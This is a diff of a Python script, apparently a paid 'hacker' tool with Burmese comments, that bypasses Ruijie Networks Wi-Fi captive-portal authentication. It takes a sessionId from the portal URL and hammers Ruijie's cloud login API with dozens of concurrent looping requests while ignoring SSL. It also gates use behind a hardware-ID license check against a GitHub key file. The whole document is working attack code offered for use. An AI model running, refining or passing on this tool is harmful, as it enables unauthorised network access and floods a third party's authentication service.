@@ -1,120 +1,131 @@
+import os
+import sys
+import json
+import time
+import base64
 import asyncio
 import aiohttp
 import requests
 import urllib3
-import os
-import sys
-import uuid
-import random
-import datetime
+import hashlib
+import platform
 from urllib.parse import urlparse, parse_qs
-from rich.console import Console
-from rich.panel import Panel
-from rich.align import Align
 
+# SSL Warning များကို ပိတ်ထားခြင်း
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-console = Console()
 
-# ===============================
-# CONFIG & LOGO
-# ===============================
-DB_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"
+class StarProject:
+    def __init__(self):
+        # သင်၏ GitHub Database Link
+        self.db_link = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"
+        self.headers = {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
+        }
 
-GREETING_LOGO = """
-[bold cyan]
-      _      
-    _(_)_    
-   (_)@(_)   [bold yellow] <( မင်္ဂလာပါ )[/bold yellow]
-     (_)\  / 
-      /  ||  
-  ___/___||___
- |____________|
-[/bold cyan]
-"""
+    def clear(self):
+        os.system('clear')
 
-BANNER = """
-[bold #00FF00]
- ╔╦╗╔═╗╔═╗  ╦ ╦╦ ╦
- ║║║║ ║║╣   ╚╦╝║ ║
- ╩ ╩╚═╝╚═╝   ╩ ╚═╝
-      [#00FF00]M O E   Y U   H A C K E R[/#00FF00]
-[/bold #00FF00]
-"""
-
-def get_hwid():
-    id_file = os.path.expanduser("~/.moe_yu_id")
-    if os.path.exists(id_file):
-        with open(id_file, "r") as f: return f.read().strip()
-    new_id = f"MOE-{str(uuid.uuid4())[:8].upper()}-{random.randint(100, 999)}"
-    with open(id_file, "w") as f: f.write(new_id)
-    return new_id
-
-def check_license():
-    my_hwid = get_hwid()
-    console.clear()
-    console.print(Align.center(GREETING_LOGO))
-    console.print(Align.center(BANNER))
-    console.print(Align.center(Panel(f"[bold white]YOUR HWID: [yellow]{my_hwid}[/yellow][/bold white]", border_style="cyan", expand=False)))
-    
-    try:
-        user_key = input("\n  [SECURITY_ACCESS] @MoeYu_").strip()
-        res = requests.get(DB_URL, timeout=10)
-        for line in res.text.splitlines():
-            parts = line.split("|")
-            if user_key == parts[0].strip():
-                db_hwid = parts[2].strip() if len(parts) > 2 else "FREE"
-                if db_hwid != "FREE" and db_hwid != my_hwid:
-                    print("\n[!] HWID Mismatch."); sys.exit()
-                print(f"\n[✓] ACCESS GRANTED!"); return True
-        print("\n[!] Invalid Key."); sys.exit()
-    except:
-        print("\n[!] Connection Error."); sys.exit()
-
-# ===============================
-# CLOUD QUERY BYPASS (NEW PATH)
-# ===============================
-async def bypass_pulse(session, url):
-    while True:
+    def get_hwid(self):
         try:
-            # 403 ကျော်ဖို့ queryStatus path ကို ပြောင်းသုံးခြင်း
-            async with session.get(url, timeout=5) as response:
-                status_color = "\033[92m" if response.status in [200, 302] else "\033[91m"
-                sys.stdout.write(f"{status_color}[✓] BYPASS ACTIVE | STATUS: {response.status}\033[0m\r")
-                sys.stdout.flush()
-        except: pass
-        await asyncio.sleep(0.05)
+            info = f"{platform.processor()}{platform.node()}{platform.machine()}{os.getlogin()}"
+            id_hash = hashlib.sha256(info.encode()).hexdigest()
+            return f"MOE-{id_hash[:12].upper()}"
+        except:
+            return "UNKNOWN-HWID-ERROR"
 
-async def start_engine(portal_link):
-    p = parse_qs(urlparse(portal_link).query)
-    sid = p.get('sessionId', [None])[0]
-    
-    if not sid:
-        console.print("[bold red][-] sessionId မတွေ့ပါ။ Browser က Link အမှန်ကို ပြန်ယူပါ။[/bold red]")
-        return
+    def banner(self, my_id):
+        self.clear()
+        print("\033[1;32m   _____ _______       _____  ")
+        print("  / ____|__   __|/\\   |  __ \\ ")
+        print(" | (___    | |  /  \\  | |__) |")
+        print("  \\___ \\   | | / /\\ \\ |  _  / ")
+        print("  ____) |  | |/ ____ \\| | \\ \\ ")
+        print(" |_____/   |_/_/    \\_\\_|  \\_\\")
+        print("\033[1;37m-"*45)
+        print(f"\033[1;33m >> OWNER : MOE YU")
+        print(f"\033[1;33m >> HWID  : {my_id}")
+        print("\033[1;37m-"*45)
 
-    # လမ်းကြောင်းအသစ် (v2 login အစား status query ကို သုံးထားသည်)
-    query_path = f"https://portal-as.ruijienetworks.com/api/maccauth/v2/queryStatus?sessionId={sid}"
-    
-    console.print(f"\n[bold green][+] Session ID: {sid[:12]}[/bold green]")
-    console.print("[bold yellow][*] Cloud Query Bypass စတင်နေပြီ...[/bold yellow]\n")
+    async def check_access(self, session, my_hwid):
+        try:
+            async with session.get(self.db_link) as response:
+                if response.status == 200:
+                    text = await response.text()
+                    # key.txt ထဲမှ HWID များကို စစ်ဆေးခြင်း
+                    if my_hwid in text:
+                        return True, "Successfully Connected"
+                    else:
+                        return False, "Your HWID is not registered!"
+                else:
+                    return False, "Server Down (404/500)"
+        except Exception as e:
+            return False, f"Connection Error: {str(e)}"
 
-    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
-        tasks = [asyncio.create_task(bypass_pulse(session, query_path)) for _ in range(30)]
-        await asyncio.gather(*tasks)
-
-def main():
-    if check_license():
-        console.print("\n[1] Auto Detect\n[2] Manual Link")
-        mode = input("\nSelect Mode: ").strip()
-        if mode == "2":
-            link = input("\nPaste Portal URL: ").strip()
-            asyncio.run(start_engine(link))
-        else:
+    async def send_pulse(self, session, url):
+        """အင်တာနက်ပွင့်စေရန် Cloud Server ဆီသို့ အမြန်နှုန်းဖြင့် Request ပို့ခြင်း"""
+        while True:
             try:
-                r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
-                asyncio.run(start_engine(r.url))
+                async with session.get(url, timeout=5) as response:
+                    status_color = "\033[1;32m" if response.status == 200 else "\033[1;31m"
+                    sys.stdout.write(f"{status_color}[✓] STAR BYPASS ACTIVE | STATUS: {response.status}\033[0m\r")
+                    sys.stdout.flush()
             except: pass
+            await asyncio.sleep(0.05)
+
+    async def start_bypass(self, portal_url):
+        p = parse_qs(urlparse(portal_url).query)
+        sid = p.get('sessionId', [None])[0]
+        res = p.get('RES', [''])[0]
+        
+        if not sid:
+            print("\n\033[1;31m[-] Session ID မတွေ့ပါ။ Link ကို Browser မှ ပြန်ကူးပါ။")
+            return
+
+        # Ruijie Cloud v2 Auth API
+        target_url = f"https://portal-as.ruijienetworks.com/api/maccauth/v2/login?sessionId={sid}&res={res}"
+        
+        print(f"\033[1;32m\n[+] Target SID: {sid[:15]}...")
+        print("\033[1;33m[*] Engine Started. Please wait for internet access.\n")
+
+        async with aiohttp.ClientSession(headers=self.headers, connector=aiohttp.TCPConnector(ssl=False)) as session:
+            tasks = [asyncio.create_task(self.send_pulse(session, target_url)) for _ in range(40)]
+            await asyncio.gather(*tasks)
+
+    async def start(self):
+        my_hwid = self.get_hwid()
+        self.banner(my_hwid)
+        
+        async with aiohttp.ClientSession(headers=self.headers) as session:
+            print("\033[1;34m[*] Verifying License... Please wait.")
+            access, message = await self.check_access(session, my_hwid)
+            
+            if access:
+                print(f"\033[1;32m[+] Access Granted: {message}")
+                await self.main_menu()
+            else:
+                print(f"\033[1;31m[-] Access Denied: {message}")
+                sys.exit()
+
+    async def main_menu(self):
+        print("\n\033[1;36m[1] Start Bypass Service")
+        print("[2] Update Script")
+        print("[3] Exit")
+        
+        opt = input("\n\033[1;32mChoose Option > ")
+        
+        if opt == "1":
+            portal_link = input("\n\033[1;33m[!] Paste Portal URL from Browser: ").strip()
+            if portal_link:
+                await self.start_bypass(portal_link)
+        elif opt == "2":
+            print("[*] Checking for updates...")
+            os.system("git pull")
+        else:
+            sys.exit()
 
 if __name__ == "__main__":
-    try: main()
-    except KeyboardInterrupt: sys.exit()
+    bot = StarProject()
+    try:
+        asyncio.run(bot.start())
+    except KeyboardInterrupt:
+        print("\n\033[1;31m[!] Stopped by user.")
